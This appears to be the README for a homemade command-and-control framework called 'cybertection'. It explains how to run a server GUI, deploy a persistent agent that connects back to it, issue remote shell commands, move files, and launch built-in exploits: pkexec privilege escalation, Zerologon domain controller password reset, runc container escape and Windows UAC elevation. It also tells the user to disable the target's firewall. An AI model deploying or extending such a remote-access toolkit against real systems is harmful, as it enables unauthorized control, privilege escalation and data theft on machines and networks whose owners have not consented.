# cybertection_server

Example Workflow
Kali Terminal 1: python3 cybertection_server.py.
Kali Terminal 2: python3 cybertection_agent.py.
GUI: Select agent, type whoami, click "Send"—see root.
Exploit: Choose "CVE-2021-4034," click "Run Exploit"—check output.
Log: Click "View Log," filter "cve" to review.
_______________________________________________________________________________________________________________

HOW TO USE


Copy and paste code in a text editor or ide

You must change the ipadress and port number in line 11.


Using the Framework
GUI Overview
Connected Agents: List of IPs/ports of active agents.
Output Area: Shows real-time logs (e.g., connections, command responses).
Command Input: Type commands to send to a selected agent.
Exploit Menu: Dropdown with exploits.
View Log: Opens a filterable log window.

Commands
Select an Agent:
Click an agent in the "Connected Agents" list (e.g., ('127.0.0.1', 54321)).

Send Basic Commands:
Type in "Command" box, click "Send":
whoami: Returns username (e.g., root on Kali).
ls (Linux) or dir (Windows): Lists directory contents.
cd /tmp: Changes directory (adjust for Windows, e.g., cd C:\Temp).
sysinfo: Shows OS and machine details.

File Transfer:
Upload: upload /path/to/file.txt (e.g., upload /home/kali/test.txt).
Download: download file.txt (saves as downloaded_file.txt on server).

Run Exploits:
Select exploit from dropdown, click "Run Exploit":
Elevate (Windows): Tries UAC elevation (Windows-only).
Inject (Windows): Simulates notepad injection (Windows-only).
CVE-2021-4034 (Linux): Escalates via pkexec (Kali, unpatched < Jan 2022).
CVE-2020-1472 (Zerologon - Windows): Resets DC password (needs impacket, DC setup).
CVE-2019-5736 (runc Escape - Linux): Container breakout (needs runc container).
Output appears in GUI and log.

View Logs:
Click "View Log".
Type in filter (e.g., "cve" to see exploit attempts).
Logs saved to cybertection_log.txt.
Exit:
Type exit in command box to disconnect an agent.
Close GUI to shut down server.
______________________________________________________________________________________________________
Troubleshooting [ERROR 111]
If you still see "Connection refused":

Server Not Listening:
netstat -tuln | grep 4444: No output means server didn’t bind.
Fix: Change port (e.g., port=5555 in both files), rerun.
Firewall:
sudo ufw status: If "inactive," use iptables -L and iptables -A INPUT -p tcp --dport 4444 -j ACCEPT.
Wrong IP:
Same machine: Keep 127.0.0.1.
Remote: Use Kali’s IP (e.g., 192.168.1.100).
SSL:
Test without: Comment wrap_socket lines in both files, rerun.


If "Connection Refused" Persists

Port Conflict: Change port=4444 to 5555 in both files, update firewall.

Firewall: sudo iptables -L (if ufw off), allow 4444: sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT.

IP: If agent’s on Windows , use Kali’s IP, not 127.0.0.1.

SSL: Test without SSL (comment out wrap_socket lines in both).
___________________________________________________________________________________________________________
TROUBLESHOOYING

Why Commands Aren’t Sending
Agent Not Selected: The GUI requires selecting an agent from the "Connected Agents" list before sending works.
Command Queue Issue: The command_queue might not be updating or clearing properly.
Threading Lock: The handle_client thread might be stuck waiting for get_command_from_gui.
Socket Error: The client socket might’ve closed silently, breaking communication.
GUI Event: The "Send" button’s logic might not trigger correctly.
__________________________________________________________________________________________________________-

How to Run on Kali Linux
Prerequisites
Python: sudo apt install python3.
OpenSSL: sudo apt install openssl.
Tkinter: sudo apt install python3-tk.
Impacket: pip3 install impacket (for CVE-2020-1472).
GCC: sudo apt install build-essential (for CVE-2021-4034, CVE-2019-5736).
Steps
Generate SSL Certs:
Run server first: python3 cybertection_server.py.
Creates server.crt and server.key if missing.

Start Server:
python3 cybertection_server.py (GUI opens).
Check terminal: Should say "started on 0.0.0.0:4444".
Verify: netstat -tuln | grep 4444.

Allow Port:
sudo ufw allow 4444/tcp (if ufw is active; check with sudo ufw status).

Run Agent:
Same machine: python3 cybertection_agent.py (uses 127.0.0.1).
Different machine: Edit server_host to Kali’s IP (e.g., 192.168.1.100 via ifconfig), then run.

Debug Output:
Agent: Look for "Attempting connection" and "Connected!" or error details.
Server: Check log in GUI or cybertection_log.txt.
__________________________________________________________________________________________________________
Prerequisites
on Kali Linux:

Python 3: Should be pre-installed (python3 --version to check).
Tkinter: For the GUI—install with sudo apt install python3-tk.
OpenSSL: For SSL certs—install with sudo apt install openssl.
Impacket: For CVE-2020-1472—install with pip3 install impacket.
GCC: For CVE-2021-4034 and CVE-2019-5736—install with sudo apt install build-essential.
Net-tools: For netstat—install with sudo apt install net-tools.
_________________________________________________________________________________________________________

CONTINUED 
Running the Framework

Scenario 1: Server and Agent on Same Machine (Kali Linux)
Start the Server:
In a terminal:
bash
Wrap
Copy
python3 cybertection_server.py
GUI titled "Cybertection Server" opens.
Terminal shows: [2025-02-23 ...] Cybertection C2 Server started on 0.0.0.0:4444 (SSL).
Verify: netstat -tuln | grep 4444 (should show 0.0.0.0:4444 listening).
Start the Agent:
In a new terminal (same directory):
bash
Wrap
Copy
python3 cybertection_agent.py
Output:
text
Wrap
Copy
[*] Attempting connection to 127.0.0.1:4444
[+] Connected to Cybertection C2 at 127.0.0.1:4444 (SSL)
GUI: "Connected Agents" list shows ('127.0.0.1', <random_port>).
Scenario 2: Server on Kali, Agent Elsewhere (e.g., HP Envy Windows)
Find Kali’s IP:
ifconfig (or ip addr): Look for inet under your network interface (e.g., eth0 or wlan0), like 192.168.1.100.
Update Agent:
Edit cybertection_agent.py:
python
Wrap
Copy
if __name__ == "__main__":
    agent = CybertectionAgent(server_host="192.168.1.100")  # Replace with Kali’s IP
    threading.Thread(target=agent.run).start()
    agent.persist()
Copy server.crt to the agent machine’s directory (optional, since CERT_NONE is used).
Start Server on Kali:
Same as above: python3 cybertection_server.py.

Start Agent on Windows:
Install Python 3 on Windows (if not already): Download from python.org.
Run: python cybertection_agent.py.
Ensure Windows Firewall allows outbound to 4444 (or disable temporarily: Control Panel > Windows Defender Firewall > Turn off).
